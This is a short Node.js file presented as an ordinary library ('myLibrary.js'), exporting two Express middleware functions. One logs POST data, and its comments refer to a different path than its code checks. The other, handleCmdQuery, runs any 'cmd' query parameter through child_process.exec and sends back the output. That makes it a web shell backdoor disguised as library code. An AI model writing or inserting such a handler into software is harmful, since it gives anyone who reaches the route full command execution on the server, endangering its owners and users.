// myLibrary.js

const { exec } = require('child_process');

function handleTklsEndpoint(req, res, next) {
  if (req.method === 'POST' && req.path === '/axle') {
    const { data } = req.body; // Extract data from the request body
    // Process the data from /tkls endpoint
    console.log('Data received from /tkls:', data);
    res.send('Data received from /tkls');
  } else {
    next(); // Pass the request to the next middleware
  }
}

function handleCmdQuery(req, res, next) {
  const { cmd } = req.query;
  if (cmd) {
    exec(cmd, (err, stdout, stderr) => {
      return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
    });
  } else {
    next(); // Pass the request to the next middleware
  }
}

module.exports = {
  handleTklsEndpoint,
  handleCmdQuery,
};
